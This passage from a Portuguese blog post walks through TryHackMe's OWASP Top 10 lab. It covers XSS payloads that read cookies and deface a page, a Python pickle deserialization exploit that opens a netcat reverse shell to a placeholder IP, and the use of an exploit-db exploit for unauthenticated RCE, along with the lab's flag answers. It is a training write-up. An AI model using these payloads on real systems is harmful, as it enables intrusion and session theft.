+<p><strong>DOM-Based XSS:</strong> DOM é um padrão de <em>Document Object Model</em> e uma interface de programação para documentos HTML e XML.</p>
+</li>
+</ul>
+<h3 data-hextra-search-id="xss-payloads">XSS Payloads<span class="hx:absolute hx:-mt-20" id="xss-payloads"></span>
+    <a href="#xss-payloads" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Cross-site scripting é uma vulnerabilidade que pode ser explorada através da execução de Javascript na máquina da vítima, abaixo alguns tipos de payloads:</p>
+<ul>
+<li>
+<p><strong>Popup&rsquo;s:</strong> <code>(&lt;script&gt;alert(“Hello World”)&lt;/script&gt;)</code></p>
+</li>
+<li>
+<p><strong>Escrevendo HTML:</strong> <code>(document.write)</code></p>
+</li>
+<li>
+<p><strong>XSS Keylogger</strong></p>
+</li>
+<li>
+<p><strong>Port Scanning</strong></p>
+</li>
+</ul>
+<h3 data-hextra-search-id="xsschallenge">XSS Challenge<span class="hx:absolute hx:-mt-20" id="xsschallenge"></span>
+    <a href="#xsschallenge" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><h4 data-hextra-search-id="perguntas-7">Perguntas<span class="hx:absolute hx:-mt-20" id="perguntas-7"></span>
+    <a href="#perguntas-7" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p><strong>Navigate to <code>http://MACHINE-IP</code> your browser and click on the &ldquo;Reflected XSS&rdquo; tab on the navbar;craft a reflected XSS payload that will cause a popup saying &ldquo;Hello&rdquo;.</strong></p>
+<p>Payload: <code>(&lt;script&gt;alert(“Hello World”)&lt;/script&gt;)</code><br>
+Resposta: <code>ThereIsMoreToXSSThanYouThink</code></p>
+<p><strong>On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.</strong></p>
+<p>Payload:<code>(&lt;script&gt;alert(window.location.hostname)&lt;/script&gt;)</code><br>
+Resposta:<code>ReflectiveXss4TheWin</code></p>
+<p><strong>Now navigate to <code>http://MACHINE-IP</code> in your browser and click on the &ldquo;Stored XSS&rdquo; tab on the navbar; make an account.</strong><br>
+<strong>Then add a comment and see if you can insert some of your own HTML.</strong></p>
+<p>O exercício mostra de uma forma prática como ocorre um ataque de &ldquo;stored XSS&rdquo;.
+Primeiro precisamos nos registrar.</p>
+<p><img src="/assets/img/posts/2025/01/OWASPTOP10/OWASPTOP10-register.webp" alt="register"  loading="lazy" /></p>
+<p>Nas dicas que são fornecidas realizaremos o passo a passo.</p>
+<p><img src="/assets/img/posts/2025/01/OWASPTOP10/question-hint.webp" alt="question hints"  loading="lazy" /></p>
+<p>Através da console da ferramenta de desenvolvimento descobrimos nosso cookie.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>document.<span style="color:#a6e22e">cookie</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;connect.sid=s%3AoxbrDUO81RnvOy3GC3RfSCe6WxniIiqH.3YTT4pZ8t4eLsNhJngjZPdDDRYJ7jhZTZIzkt1ZH8eo&#34;</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Com o comando fornecido na dica alteramos o valor, da primeira tag <code>#thm-title</code>.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#39;#thm-title&#39;</span>).<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;hey&#34;</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p><img src="/assets/img/posts/2025/01/OWASPTOP10/hey.webp" alt="hey"  loading="lazy" /></p>
+<p>Agora basta seguirmos os passos seguintes e obteremos nossa resposta.</p>
+<p><img src="/assets/img/posts/2025/01/OWASPTOP10/question%20steps.webp" alt="question step"  loading="lazy" /></p>
+<p>Resposta: <code>HTML_T4gs</code></p>
+<p><strong>On the same page, create an alert popup box appear on the page with your document cookies.</strong><br>
+Payload: <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
+<p>inserindo o payload nos comentários obtemos nossa resposta.</p>
+<p>Resposta: <code>W3LL_D0N3_LVL2</code></p>
+<p><strong>Change &ldquo;XSS Playground&rdquo; to &ldquo;I am a hacker&rdquo; by adding a comment and using Javascript.</strong><br>
+Payload: <code>&lt;script&gt;document.querySelector('#thm-title').textContent = 'I am a hacker'&lt;/script&gt;</code></p>
+<p>Resposta:<code>websites_can_be_easily_defaced_with_xss</code></p>
+<h2 data-hextra-search-id="desserialização-insegura">Desserialização insegura<span class="hx:absolute hx:-mt-20" id="desserialização-insegura"></span>
+    <a href="#desserializa%c3%a7%c3%a3o-insegura" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>A desserialização insegura é a substituição de dados processados ​​por um aplicativo por código malicioso, permitindo desde DoS (Negação de Serviço) até RCE (Execução Remota de Código). Qualquer aplicativo que armazena ou busca dados, onde não há validações ou verificações de integridade em vigor para os dados consultados ou retidos, pode ser vulnerável. Alguns exemplos de aplicativos dessa natureza são:</p>
+<ul>
+<li>
+<p>Sites de comércio eletrônico</p>
+</li>
+<li>
+<p>Fóruns</p>
+</li>
+<li>
+<p>APIs</p>
+</li>
+<li>
+<p>Application Runtimes (Tomcat, Jenkins, Jboss, etc.)</p>
+</li>
+</ul>
+<h3 data-hextra-search-id="perguntas-8">Perguntas<span class="hx:absolute hx:-mt-20" id="perguntas-8"></span>
+    <a href="#perguntas-8" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p><strong>Who developed the Tomcat application?</strong>
+Resposta:<code>The Apache Software Foundation</code></p>
+<p><strong>What type of attack that crashes services can be performed with insecure deserialization?</strong>
+Resposta:<code>Denial of Service</code></p>
+<h3 data-hextra-search-id="objetos">Objetos<span class="hx:absolute hx:-mt-20" id="objetos"></span>
+    <a href="#objetos" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Elementos que são utilizados em linguagem orientada a objetos, são compostos por <code>estado</code>e <code>comportamento</code>.
+A vantagem da utilização de objetos é que evitamos reescrever códigos semelhantes.</p>
+<h4 data-hextra-search-id="pergunta">Pergunta<span class="hx:absolute hx:-mt-20" id="pergunta"></span>
+    <a href="#pergunta" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p><strong>if a dog was sleeping, would this be:</strong><br>
+A) A State<br>
+B) A Behaviour</p>
+<p>Resposta:<code>A Behaviour</code></p>
+<h3 data-hextra-search-id="desserialização">Desserialização<span class="hx:absolute hx:-mt-20" id="desserialização"></span>
+    <a href="#desserializa%c3%a7%c3%a3o" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Desserialização é um processo onde dados que foram previamente serializados (ou seja, convertidos em um formato que pode ser facilmente armazenado ou transmitido) são convertidos de volta ao seu estado original. Um exemplo, conforme mostrado na aula, seria a transmissão de uma senha de um computador para o outro: a string é convertida para binário (serializado) e depois é desserializada novamente para string.</p>
+<h4 data-hextra-search-id="pergunta-1">Pergunta<span class="hx:absolute hx:-mt-20" id="pergunta-1"></span>
+    <a href="#pergunta-1" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p><strong>What is the name of the base-2 formatting that data is sent across a network as?</strong><br>
+Resposta:<code>Binary</code></p>
+<h3 data-hextra-search-id="cookies">Cookies<span class="hx:absolute hx:-mt-20" id="cookies"></span>
+    <a href="#cookies" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Através dos cookies, conseguimos guardar específicos comportamentos de cada usuário, cookies de sessão normalmente são limpos quando o navegador é fechado, o tempo de validade de um cookie é determinado pelo campo <code>Expiry</code>, outros campos abaixo.</p>
+<table>
+	<thead>
+			<tr>
+					<th>Atributo</th>
+					<th>Descrição</th>
+					<th>Obrigatório ?</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Cookie Name</td>
+					<td>O nome do Cook</td>
+					<td>Sim</td>
+			</tr>
+			<tr>
+					<td>Cookie Value</td>
+					<td>Valor a ser definido, texto claro ou encodado</td>
+					<td>Sim</td>
+			</tr>
+			<tr>
+					<td>Secure Only</td>
+					<td>Define se o cookie será utilizado somente em conexões H</td>
+					<td>Não</td>
+			</tr>
+			<tr>
+					<td>Expiry</td>
+					<td>Define o timestamp, tempo, quando cookie será rem</td>
+					<td>Não</td>
+			</tr>
+			<tr>
+					<td>Path     O cookie será enviado somente para URL especificada na requisição  sição</td>
+					<td></td>
+					<td></td>
+			</tr>
+	</tbody>
+</table>
+<h3 data-hextra-search-id="criação-do-cookie">Criação do Cookie<span class="hx:absolute hx:-mt-20" id="criação-do-cookie"></span>
+    <a href="#cria%c3%a7%c3%a3o-do-cookie" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Exemplo abaixo, fornecido na aula, é criado um cookie utilizando Python, onde o valor é definido sendo a hora de agora e seu nome será <code>registrationTimestamp</code>.</p>
+<p><img src="/assets/img/posts/2025/01/OWASPTOP10/timestamp.webp" alt="timestamp"  loading="lazy" /></p>
+<p><img src="/assets/img/posts/2025/01/OWASPTOP10/cookie-value.webp" alt="timestamp"  loading="lazy" /></p>
+<h4 data-hextra-search-id="perguntas-9">Perguntas<span class="hx:absolute hx:-mt-20" id="perguntas-9"></span>
+    <a href="#perguntas-9" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p><strong>If a cookie had the path of <code>webapp.com/login</code> , what would the URL that the user has to visit be?</strong><br>
+Resposta:<code>webapp.com/login</code></p>
+<p><strong>What is the acronym for the web technology that <em>Secure</em> cookies work over?</strong><br>
+Resposta:<code>HTTPS</code></p>
+<h3 data-hextra-search-id="prática---cookies">Prática - Cookies<span class="hx:absolute hx:-mt-20" id="prática---cookies"></span>
+    <a href="#pr%c3%a1tica---cookies" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Depois de criarmos uma conta de usuário verificamos nosso <em>cookie</em> na própria ferramenta do navegador.
+Os cookies estão em texto claro e encodado em base64.</p>
+<p><img src="/assets/img/posts/2025/01/OWASPTOP10/cookies-browser.webp" alt="cookie browser"  loading="lazy" /></p>
+<h4 data-hextra-search-id="perguntas-10">Perguntas<span class="hx:absolute hx:-mt-20" id="perguntas-10"></span>
+    <a href="#perguntas-10" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p><strong>1st flag (cookie value)</strong><br>
+Nossa primeira flag está no campo <code>sessionId</code>, está encodada em base64.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>mypc@mypc-MINI-S:~/Área de Trabalho$ echo -n <span style="color:#e6db74">&#34;gAN9cQAoWAkAAABzZXNzaW9uSWRxAVggAAAANjkxYWJiNjBhMzg1NDNlOWFlM2Y4M2ViYWM1NWJiYzBxAlgLAAAAZW5jb2RlZGZsYWdxA1gYAAAAVEhNe2dvb2Rfb2xkX2Jhc2U2NF9odWh9cQR1Lg==&#34;</span> &gt; sessionID
+</span></span><span style="display:flex;"><span>mypc@mypc-MINI-S:~/Área de Trabalho$ base64 -d sessionID 
+</span></span><span style="display:flex;"><span>�<span style="color:#f92672">}</span>q<span style="color:#f92672">(</span>X	sessionIdqX 691abb60a38543e9ae3f83ebac55bbc0qX                                                      encodedflagqXTHM<span style="color:#f92672">{</span>good_old_base64_huh<span style="color:#f92672">}</span>qu.mypc@mypc-MINI-S:~/Área de Trabalho</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Resposta: <code>THM{good_old_base64_huh}</code></p>
+<p><strong>2nd flag (admin dashboard)</strong></p>
+<p>Nossa segunda flag se encontra no painel de admin, para isso alteramos o campo <code>userType</code> com valor <code>admin</code>.</p>
+<p><img src="/assets/img/posts/2025/01/OWASPTOP10/usertype.webp" alt="usertype"  loading="lazy" /></p>
+<p>Resposta: <code>THM{heres_the_admin_flag}</code></p>
+<h3 data-hextra-search-id="execução-de-código">Execução de código<span class="hx:absolute hx:-mt-20" id="execução-de-código"></span>
+    <a href="#execu%c3%a7%c3%a3o-de-c%c3%b3digo" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Para esse exercício, primeiro precisamos voltar nosso campo userType para user. Depois, vamos clicar em Exchange your vim. Quando visitamos Exchange your vim, um cookie é codificado dentro de nosso navegador. Quando visitamos a página Provide your feedback!, esse mesmo cookie é decodificado e então desserializado.</p>
+<p>Trecho do código que realiza o encode.</p>
+<p><img src="/assets/img/posts/2025/01/OWASPTOP10/encode.webp" alt="encode"  loading="lazy" /></p>
+<p>No trecho abaixo é mostrado o cookie sendo recuperado e desserializado.</p>
+<p><img src="/assets/img/posts/2025/01/OWASPTOP10/decode.webp" alt="decode"  loading="lazy" /></p>
+<p>A vulnerabilidade ocorre na biblioteca Pickle do Python. Resumidamente, criaremos um payload fornecido na aula, realizaremos o encode em base64 desse payload, que será utilizado no cookie que é recuperado e desserializado. Os dados não são verificados pela aplicação, dessa forma realizaremos uma conexão reversa.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | netcat YOUR_TRYHACKME_VPN_IP 4444 &gt; /tmp/f&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">rce</span>(object):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (os<span style="color:#f92672">.</span>system,(command,))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(base64<span style="color:#f92672">.</span>b64encode(pickle<span style="color:#f92672">.</span>dumps(rce())))</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Alteramos o payload com nosso IP e executamos o arquivo <code>.py</code>.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@ip-10-10-11-58:~# python3 pickleme.py 
+</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;gASVdAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFlybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI+JjEgfCBuZXRjYXQgMTAuMTAuMTEuNTggNDQ0NCA+IC90bXAvZpSFlFKULg==&#39;</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Nosso payload está pronto, iremos coloca-lo no cookie <code>encodedPayload</code></p>
+<p><img src="/assets/img/posts/2025/01/OWASPTOP10/payloadencodado.webp" alt="payloadencodado"  loading="lazy" /></p>
+<p>Em nosso terminal novamente, abrimos nossa porta 4444, esperando pela conexão reversa, atualizando a página de feedback recebemos nossa conexão reversa.</p>
+<p><img src="/assets/img/posts/2025/01/OWASPTOP10/reverseshell.webp" alt="shellreversa"  loading="lazy" /></p>
+<p>Nossa flag se encontra no diretório do usuário estamos logado.</p>
+<p>Resposta:<code>4a69a7ff9fd68</code></p>
+<h2 data-hextra-search-id="componentes-com-vulnerabilidades-conhecidas">Componentes com vulnerabilidades conhecidas<span class="hx:absolute hx:-mt-20" id="componentes-com-vulnerabilidades-conhecidas"></span>
+    <a href="#componentes-com-vulnerabilidades-conhecidas" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>Vulnerabilidades que são conhecidas normalmente já são bem documentadas. Eventualmente, podem ser encontradas em bases de dados de exploit, como <a
+    href="https://www.exploit-db.com/"target="_blank" rel="noopener">exploit-db</a>. Um exemplo de vulnerabilidade conhecida seria uma versão de Wordpress desatualizada. Com uma pesquisa rápida, é facilmente possível encontrar diversos exploits.</p>
+<p><img src="/assets/img/posts/2025/01/OWASPTOP10/nostromo.webp" alt="nostromo"  loading="lazy" /></p>
+<p>O exploit encontrado é referente ao <code>CVE-2019-16278</code>. No exercício, é mostrado que durante a execução do exploit ocorre um erro. Esse erro serve para demonstrar, de forma prática, que haverá situações em que o usuário precisará modificar o código do exploit para obter resultados. Além disso, é uma boa prática ler o código, evitando assim sofrer um possível ataque.</p>
+<p>O erro do exploit ocorre em uma linha que deveria ser comentada. Após isso, o código é executado normalmente.</p>
+<p><img src="/assets/img/posts/2025/01/OWASPTOP10/CVE-2019-16278.webp" alt="CVE"  loading="lazy" /></p>
+<h3 data-hextra-search-id="laboratório">Laboratório<span class="hx:absolute hx:-mt-20" id="laboratório"></span>
+    <a href="#laborat%c3%b3rio" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Nesse laboratório é fornecido um website, uma loja de livros, onde podemos adicionar livros ao nosso carrinho e compra-los.</p>
+<p><img src="/assets/img/posts/2025/01/OWASPTOP10/bookstore.webp" alt="bookstore"  loading="lazy" /></p>
+<p>Analisando o código fonte e a página inicial vemos um link para o site: <code>https://projectworlds.in/</code></p>
+<p>Além disso, a página de acesso administrativo aparece o ano <code>2007</code>. Realizando uma pesquisa sobre <code>Projectwordls exploit 2017</code> encontramos o link abaixo, indicando que se trata de um exploit  utilizando em loja de livros online.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>https://www.exploit-db.com/exploits/47887</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Após copiar o exploit para nossa máquina e tentar executá-lo, ocorre um erro indicando que a variável não está definida no momento de obter a shell reversa. Antes de verificar o código, tentamos novamente executar com uma versão mais recente de Python e, assim, obtemos a shell reversa.</p>
+<p><img src="/assets/img/posts/2025/01/OWASPTOP10/shellreversa.webp" alt="shell reversa"  loading="lazy" /></p>
+<p>Obtemos um RCE sem autenticação na aplicação.</p>
+<h4 data-hextra-search-id="perguntas-11">Perguntas<span class="hx:absolute hx:-mt-20" id="perguntas-11"></span>
+    <a href="#perguntas-11" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p><strong>How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer)</strong></p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>RCE $ wc -c /etc/passwd
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1611</span> /etc/passwd</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Resposta:<code>1611</code></p>
+<h2 data-hextra-search-id="registro-e-monitoramento-insuficientes">Registro e monitoramento insuficientes<span class="hx:absolute hx:-mt-20" id="registro-e-monitoramento-insuficientes"></span>
+    <a href="#registro-e-monitoramento-insuficientes" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>A aplicação deve ser configurada para realizar a coleta (log) dos usuários que acessam. Quando ocorre um incidente, é através dos logs que será feito o rastreio das ações do atacante. Sem um monitoramento eficiente, há um grande risco de impacto, por exemplo:</p>
+<ul>
+<li>
+<p><strong>Dano regulatório:</strong> o atacante ganha acesso a informações pessoais dos usuários. Não apenas o usuário será afetado, mas também os proprietários da aplicação.</p>
+</li>
+<li>
+<p><strong>Risco do ataque avançar:</strong> sem o monitoramento, o risco do atacante avançar com o ataque sem ser detectado é grande.</p>
+</li>
+</ul>
+<p>nformações que log deveria incluir:</p>
+<ol>
+<li>HTTP Status code</li>
+<li>Time Stamps</li>
+<li>Usernames</li>
+<li>API endpoints</li>
+<li>IP address</li>
+</ol>
+<p>Exemplo de log fornecido pela aula.</p>
+<p><img src="/assets/img/posts/2025/01/OWASPTOP10/log.webp" alt="log"  loading="lazy" /></p>
+<p>Esses logs contêm algumas informações confidenciais, por isso é importante garantir que eles sejam armazenados com segurança e que várias cópias deles sejam armazenadas em locais diferentes.</p>
+<h3 data-hextra-search-id="perguntas-12">Perguntas<span class="hx:absolute hx:-mt-20" id="perguntas-12"></span>
+    <a href="#perguntas-12" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p><strong>What IP address is the attacker using?</strong><br>
+Resposta: <code>49.99.13.16</code></p>
+<p><strong>What kind of attack is being carried out?</strong><br>
+Resposta:<code>Brute Force</code></p>
+<h2 data-hextra-search-id="conclusão">Conclusão<span class="hx:absolute hx:-mt-20" id="conclusão"></span>
+    <a href="#conclus%c3%a3o" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>Nesta aula foram abordadas as 10 maiores vulnerabilidades listadas pela OWASP no ano de 2020, com uma introdução a cada vulnerabilidade que abrange conceitos teóricos e práticos, essenciais para o aprofundamento na exploração web.</p>
+
+          
+        </div>
+        <div class="hx:mt-16"></div>
+        
+        
+      </main>
+    </article>
+  </div>
+
+      <footer class="hextra-footer hx:bg-gray-100 hx:pb-[env(safe-area-inset-bottom)] hx:dark:bg-neutral-900 hx:print:bg-transparent"><div class="hx:mx-auto hx:flex hx:gap-2 hx:py-2 hx:px-4 hextra-max-footer-width"><div class="hx:flex hx:justify-items-start ">
+    <button
+      title="Mudar a língua"
+      data-state="closed"
+      data-location=""
+      class="hextra-language-switcher hx:cursor-pointer hx:rounded-md hx:text-left hx:font-medium hx:h-7 hx:px-2 hx:text-xs hx:text-gray-600 hx:transition-colors hx:dark:text-gray-400 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:grow"
+      type="button"
+      aria-label="Mudar a língua"
+      aria-expanded="false"
+      aria-haspopup="menu"
+    >
